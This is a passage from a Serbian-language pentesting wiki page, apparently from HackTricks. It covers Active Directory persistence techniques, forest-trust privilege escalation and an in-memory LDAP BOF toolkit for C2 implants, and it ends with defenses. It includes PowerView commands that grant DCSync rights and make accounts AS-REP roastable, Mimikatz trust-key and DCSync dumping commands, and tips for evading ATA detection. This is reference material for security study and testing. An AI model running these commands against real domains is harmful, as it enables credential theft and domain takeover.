```

- Učiniti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodeliti [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Silver Ticket attack kreira **legitiman Ticket Granting Service (TGS) ticket** za specifičan servis koristeći **NTLM hash** (na primer, **hash PC naloga**). Ova metoda se koristi za **pristup privilegijama servisa**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** podrazumeva da napadač dobije pristup **NTLM hash-u krbtgt account-a** u Active Directory (AD) okruženju. Ovaj nalog je specijalan jer se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su ključni za autentifikaciju unutar AD mreže.

Kada napadač dobije ovaj hash, može kreirati **TGT-ove** za bilo koji nalog koji izabere (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ovo su kao golden tickets, ali falsifikovani na način koji **zaobilazi uobičajene mehanizme detekcije golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posedovanje sertifikata naloga ili mogućnost njihovog zahteva** je vrlo dobar način da se obezbedi persistenca na korisničkom nalogu (čak i ako korisnik promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Korišćenjem sertifikata takođe je moguće trajno zadržati visoke privilegije unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekat **AdminSDHolder** u Active Directory obezbeđuje sigurnost **privilegovanih grupa** (kao Domain Admins i Enterprise Admins) primenom standardne **Access Control List (ACL)** na ove grupe kako bi se sprečile neautorizovane izmene. Međutim, ova funkcija se može zloupotrebiti; ako napadač izmeni AdminSDHolder-ov ACL da da puna prava običnom korisniku, taj korisnik dobija opsežnu kontrolu nad svim privilegovanim grupama. Ova mera koja je namenjena zaštiti može tako postati napadnuta tačka ukoliko se ne prati pažljivo.

[**Više informacija o AdminDSHolder Group ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Unutar svakog **Domain Controller (DC)** postoji **lokalni administrator** nalog. Dobijanjem admin prava na takvoj mašini, lokalni Administrator hash se može izvući koristeći **mimikatz**. Nakon toga je potrebna izmena registra da bi se **omogućila upotreba te lozinke**, što omogućava daljinski pristup lokalnom Administrator nalogu.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **dodeliti** neke **specijalne permisije** korisniku nad određenim domen objektima koje će omogućiti tom korisniku da **eskalira privilegije u budućnosti**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za **čuvanje** **permisija** koje **objekat** ima **nad** nekim resursom. Ako možete napraviti i samo **mali izmen** u **security descriptor-u** objekta, možete dobiti veoma interesantne privilegije nad tim objektom bez potrebe da budete član neke privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji da uspostavite **univerzalnu lozinku**, što daje pristup svim domen nalozima.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete kreirati svoj **SSP** da **uhvatite** u **clear text** **kredencijale** korišćene za pristup mašini.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registruje **novi Domain Controller** u AD i koristi ga da **gurne atribute** (SIDHistory, SPNs...) na specificirane objekte **bez** ostavljanja **logova** o tim **izmenama**. Potrebne su vam DA privilegije i biti unutar **root domain-a**.\
Napomena: ako koristite pogrešne podatke, pojaviće se prilično ružni logovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ranije smo govorili o tome kako eskalirati privilegije ako imate **dovoljne permisije da čitate LAPS password-e**. Međutim, ove lozinke se takođe mogu koristiti za **održavanje persistence-a**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft posmatra **Forest** kao sigurnosnu granicu. To implicira da **kompromitovanje jednog domena može potencijalno dovesti do kompromitovanja cele Foresta**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je sigurnosni mehanizam koji omogućava korisniku iz jednog **domena** da pristupi resursima u drugom **domenu**. On u suštini stvara povezanost između autentikacionih sistema ta dva domena, dozvoljavajući tok verifikacija autentikacije. Kada domeni uspostave trust, oni razmenjuju i čuvaju određene **ključeve** u svojim **Domain Controller-ima (DCs)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **trusted domain-u**, prvo mora da zahteva poseban ticket poznat kao **inter-realm TGT** od svog DC. Ovaj TGT je enkriptovan sa zajedničkim **ključem** koji su oba domena dogovorila. Korisnik zatim podnese ovaj TGT **DC-u trusted domain-a** da bi dobio servisni ticket (**TGS**). Nakon uspešne verifikacije inter-realm TGT-a od strane DC-a trusted domain-a, on izda TGS, dajući korisniku pristup servisu.

**Koraci**:

1. A **client computer** u **Domain 1** započinje proces koristeći svoj **NTLM hash** da zatraži **Ticket Granting Ticket (TGT)** od svog **Domain Controller (DC1)**.
2. DC1 izdaje novi TGT ako je klijent uspešno autentifikovan.
3. Klijent zatim traži **inter-realm TGT** od DC1, koji je potreban da pristupi resursima u **Domain 2**.
4. Inter-realm TGT je enkriptovan sa **trust key** koji dele DC1 i DC2 kao deo dvosmernog domain trust-a.
5. Klijent nosi inter-realm TGT do **Domain 2's Domain Controller (DC2)**.
6. DC2 verifikuje inter-realm TGT koristeći zajednički trust key i, ako je važeći, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kojem klijent želi da pristupi.
7. Na kraju, klijent prezentuje ovaj TGS serveru, koji je enkriptovan sa hash-om server account-a, da bi dobio pristup servisu u Domain 2.

### Different trusts

Važno je primetiti da **trust može biti jednosmeran ili dvosmeran**. U opciji sa 2 načina, oba domena će verovati jedno drugom, ali u **jednosmernoj** relaciji jedan od domena će biti **trusted**, a drugi **trusting** domen. U poslednjem slučaju, **moći ćete da pristupate resursima unutar trusting domena iz trusted domena**.

Ako Domain A veruje Domain-u B, A je trusting domen, a B je trusted. Štaviše, u **Domain A**, ovo bi bio **Outbound trust**; a u **Domain B**, ovo bi bio **Inbound trust**.

**Različiti odnosi poverenja**

- **Parent-Child Trusts**: Ovo je uobičajena konfiguracija unutar iste foreste, gde child domen automatski ima dvosmerni tranzitivni trust sa svojim parent domenom. U suštini, ovo znači da autentikacijski zahtevi mogu teći neometano između parent-a i child-a.
- **Cross-link Trusts**: Poznati kao "shortcut trusts", uspostavljaju se između child domena da ubrzaju referral procese. U kompleksnim forest-ovima, autentikacioni referali obično moraju putovati do root-a forest-a pa zatim do cilj domena. Kreiranjem cross-linkova, putanja se skraćuje, što je posebno korisno u geografski raštrkanim okruženjima.
- **External Trusts**: Ovi se uspostavljaju između različitih, nepovezanih domena i po prirodi su netransitivni. Prema [Microsoft dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts su korisni za pristup resursima u domenu van trenutne foreste koji nije povezan forest trust-om. Bezbednost se pojačava kroz SID filtering sa external trust-ovima.
- **Tree-root Trusts**: Ovi trustovi se automatski uspostavljaju između root domena foreste i novododanog tree root-a. Iako se ne sreću često, tree-root trust-ovi su važni prilikom dodavanja novih domain tree-ova u forest, omogućavajući im da zadrže jedinstveno ime domena i osiguravaju dvosmernu tranzitivnost. Više informacija možete pronaći u [Microsoft-ovom vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ova vrsta trust-a je dvosmerni tranzitivni trust između dva forest root domena, takođe primenjujući SID filtering radi unapređenja bezbednosnih mera.
- **MIT Trusts**: Ovi trustovi se uspostavljaju sa non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trusts su specijalizovaniji i namenjeni integraciji sa Kerberos-baziranim sistemima izvan Windows ekosistema.

#### Other differences in **trusting relationships**

- Trust relationship takođe može biti **transitive** (A trustuje B, B trustuje C, onda A trustuje C) ili **non-transitive**.
- Trust relationship može biti podešen kao **bidirectional trust** (oba veruju jedno drugom) ili kao **one-way trust** (samo jedan veruje drugom).

### Attack Path

1. **Enumeriši** odnose poverenja
2. Proveri da li bilo koji **security principal** (user/group/computer) ima **access** do resursa **drugog domena**, možda kroz ACE unose ili članstvom u grupama drugog domena. Traži **odnose preko domena** (trust je verovatno kreiran zbog ovoga).
1. kerberoast u ovom slučaju može biti druga opcija.
3. **Kompromituj** **naloge** koji mogu **pivot-ovati** kroz domene.

Napadači mogu dobiti pristup resursima u drugom domenu kroz tri primarna mehanizma:

- **Local Group Membership**: Principali mogu biti dodati u lokalne grupe na mašinama, kao što je grupa “Administrators” na serveru, dajući im značajnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principali takođe mogu biti članovi grupa unutar stranog domena. Međutim, efikasnost ove metode zavisi od prirode trust-a i opsega grupe.
- **Access Control Lists (ACLs)**: Principali mogu biti navedeni u **ACL-u**, naročito kao entiteti u **ACE-ovima** unutar **DACL-a**, dajući im pristup specifičnim resursima. Za one koji žele dublje da zaronе u mehaniku ACL-ova, DACL-ova i ACE-ova, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” je neprocenjiv resurs.

### Find external users/groups with permissions

Možete proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da biste pronašli foreign security principals u domenu. Ovo će biti user/group iz **eksternog domena/foresta**.

Možete ovo proveriti u **Bloodhound** ili koristeći **powerview**:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumeraciju poverenja domena:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 trusted keys**, jedan za _Child --> Parent_ i drugi za _Parent_ --> _Child_.\
> Možete proveriti koji ključ koristi trenutni domen pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Povišite privilegije na Enterprise Admin u child/parent domenu zloupotrebljavajući trust uz SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje kako se Configuration Naming Context (NC) može iskoristiti je ključno. Configuration NC služi kao centralni repozitorijum za konfiguracione podatke kroz forest u Active Directory (AD) okruženjima. Ti podaci se repliciraju na svaki Domain Controller (DC) u forestu, pri čemu writable DCs održavaju zapisivu kopiju Configuration NC. Za iskorišćavanje je neophodno imati **SYSTEM privileges on a DC**, po mogućstvu na child DC.

**Link GPO to root DC site**

Sites kontejner Configuration NC sadrži informacije o sajtovima svih računara pridruženih domenu unutar AD forest-a. Operisanjem sa **SYSTEM privileges** na bilo kojem DC, napadači mogu linkovati GPOs za root DC sites. Ova radnja može kompromitovati root domen manipulacijom politikama koje se primenjuju na tim sajtovima.

Za detaljnije informacije, pogledajte istraživanje o [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jedan vektor napada uključuje ciljanje privilegovanih gMSA u domenu. KDS Root key, koji je neophodan za izračunavanje lozinki gMSA, čuva se u Configuration NC. Sa **SYSTEM privileges** na bilo kojem DC moguće je pristupiti KDS Root key i izračunati lozinke za bilo koji gMSA u forestu.

Detaljna analiza i korak-po-korak uputstvo dostupni su u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementarni delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatna eksterna istraživanja: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ova metoda zahteva strpljenje — čekanje na kreiranje novih privilegovanih AD objekata. Sa **SYSTEM privileges**, napadač može izmeniti AD Schema kako bi dao bilo kom korisniku potpunu kontrolu nad svim klasama. To može dovesti do neovlašćenog pristupa i kontrole nad novo kreiranim AD objektima.

Za dalje čitanje pogledajte [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Ranljivost ADCS ESC5 cilja kontrolu nad Public Key Infrastructure (PKI) objektima kako bi se kreirao certificate template koji omogućava autentifikaciju kao bilo koji korisnik unutar forest-a. Pošto se PKI objekti nalaze u Configuration NC, kompromitovanje writable child DC omogućava izvođenje ESC5 napada.

Više detalja može se pročitati u [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). U scenarijima gde nedostaje ADCS, napadač ima mogućnost da postavi potrebne komponente, kao što je opisano u [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vaš domen je poveren** od strane spoljnog domena, što vam daje **neodređena ovlašćenja** nad njim. Moraćete da otkrijete **koji nalozi vašeg domena imaju koja prava pristupa nad spoljnim domenom** i zatim pokušate da to iskoristite:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Spoljni Forest domen - jednosmerno (izlazno)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** **poverava** neke **privilegije** principalu iz **drugog domena**.

Međutim, kada domen bude poveren od strane poverljivog domena, trusted domen kreira korisnika sa predvidljivim imenom koji kao lozinku koristi trusted password. To znači da je moguće **pristupiti korisniku iz poverljivog domena da se uđe u trusted domen** kako bi se izvršila enumeracija i pokušala dalja eskalacija privilegija:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način da se kompromituje trusted domen je pronalaženje [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnoj smeru** od domain trust-a (što nije često).

Još jedan način kompromitacije trusted domena je čekanje na mašini na kojoj **korisnik iz trusted domena** može da se prijavi preko **RDP**. Napadač potom može da injektuje kod u proces RDP sesije i odatle **pristupi origin domenu žrtve**.\
Pored toga, ako je **žrtva montirala svoj hard disk**, iz procesa RDP sesije napadač može da ostavi **backdoors** u **startup folderu hard diska**. Ova tehnika se naziva **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigacija zloupotrebe poverenja domena

### **SID Filtering:**

- Rizik napada koji koriste SID history atribut preko forest trust-ova se ublažava pomoću SID Filtering, koji je podrazumevano aktiviran na svim inter-forest trust-ovima. Ovo proizilazi iz pretpostavke da su intra-forest trust-ovi sigurni, smatrajući forest, a ne domen, bezbednosnom granicom u skladu sa Microsoft-ovim pristupom.
- Međutim, postoji problem: SID filtering može ometati aplikacije i pristup korisnika, što ponekad dovodi do njegove deaktivacije.

### **Selective Authentication:**

- Za inter-forest trust-ove, korišćenje Selective Authentication osigurava da korisnici iz dva foresta nisu automatski autentifikovani. Umesto toga, potrebna su eksplicitna dozvoljavanja da bi korisnici pristupili domenima i serverima u okviru poverljivog domena ili foresta.
- Važno je napomenuti da ove mere ne štite od zloupotrebe writable Configuration Naming Context (NC) niti od napada na trust account.

[**Više informacija o domain trusts na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD zloupotreba iz On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implementira bloodyAD-style LDAP primitiva kao x64 Beacon Object Files koje rade u potpunosti unutar on-host implantata (npr. Adaptix C2). Operateri kompajliraju paket sa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitaju `ldap.axs`, i zatim pozovu `ldap <subcommand>` iz beacon-a. Sav saobraćaj koristi trenutni logon security context preko LDAP-a (389) sa signing/sealing ili LDAPS-a (636) sa automatskim poveravanjem sertifikata, tako da nisu potrebni socks proxy-i ili disk artefakti.

### Implant-side LDAP enumeracija

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` razrešavaju skraćena imena/OU putanje u pune DN-ove i ispisuju odgovarajuće objekte.
- `get-object`, `get-attribute`, and `get-domaininfo` vade proizvoljne atribute (uključujući security descriptors) plus forest/domain metadata iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` otkrivaju roasting kandidata, delegation podešavanja, i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskriptore direktno iz LDAP-a.
- `get-acl` and `get-writable --detailed` parsiraju DACL da navedu trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), i nasleđivanje, dajući neposredne mete za ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operateru da postavi nove principe ili mašinske naloge tamo gde postoje prava nad OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` direktno preuzimaju ciljeve čim se pronađu write-property prava.
- Komande fokusirane na ACL poput `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync` prevode WriteDACL/WriteOwner na bilo kom AD objektu u reset lozinki, kontrolu članstva u grupama ili DCSync privilegije bez ostavljanja PowerShell/ADSI artefakata. `remove-*` protivnici čiste ubacene ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` momentalno čine kompromitovanog korisnika Kerberoastable; `add-asreproastable` (UAC toggle) označava korisnika za AS-REP roasting bez diranja lozinke.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) prepisuju `msDS-AllowedToDelegateTo`, UAC flags ili `msDS-AllowedToActOnBehalfOfOtherIdentity` iz beacona, omogućavajući constrained/unconstrained/RBCD napade i eliminišući potrebu za remote PowerShell ili RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` ubacuje privilegovane SIDs u SID history kontrolisanog principala (see [SID-History Injection](sid-history-injection.md)), pružajući prikriveno nasledjivanje pristupa potpuno preko LDAP/LDAPS.
- `move-object` menja DN/OU računara ili korisnika, omogućavajući napadaču da premesti resurse u OU gde već postoje delegirana prava pre nego što zloupotrebi `set-password`, `add-groupmember`, ili `add-spn`.
- Strogo ograničene komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) omogućavaju brzi rollback nakon što operater ubere kredencijale ili postigne persistence, minimizirajući telemetriju.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Preporučeno je da se Domain Admins dozvoli prijava samo na Domain Controllers, izbegavajući njihovu upotrebu na drugim hostovima.
- **Service Account Privileges**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi bezbednosti.
- **Temporal Privilege Limitation**: Za zadatke koji zahtevaju DA privilegije, njihovo trajanje treba ograničiti. Ovo se može postići pomoću: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event ID-ovi 2889/3074/3075 i potom primena LDAP signing plus LDAPS channel binding na DCs/klijentima kako bi se blokirali LDAP MITM/relay pokušaji.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementacija deception uključuje postavljanje zamki, kao što su decoy korisnici ili računari, sa karakteristikama poput passwords that do not expire ili označenih kao Trusted for Delegation. Detaljan pristup uključuje kreiranje korisnika sa specifičnim pravima ili dodavanje u visokoprivilegirane grupe.
- Praktičan primer uključuje korišćenje alata poput: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više o deploy-deception tehnikama može se naći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Sumnjivi indikatori uključuju netipičan ObjectSID, retke prijave, datume kreiranja i nizak broj failed password pokušaja.
- **General Indicators**: Poređenje atributa potencijalnih decoy objekata sa stvarnim može otkriti nedoslednosti. Alati poput [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pomažu u identifikaciji takvih decepija.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje session enumeration na Domain Controllers kako bi se sprečila ATA detekcija.
- **Ticket Impersonation**: Korišćenje **aes** ključeva za kreiranje tiketa pomaže da se izbegne detekcija jer se ne spušta na NTLM.
- **DCSync Attacks**: Izvršavanje sa ne-Domain Controller-a se savetuje da bi se izbegla ATA detekcija, jer direktno izvršenje sa Domain Controller-a okida alert-e.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
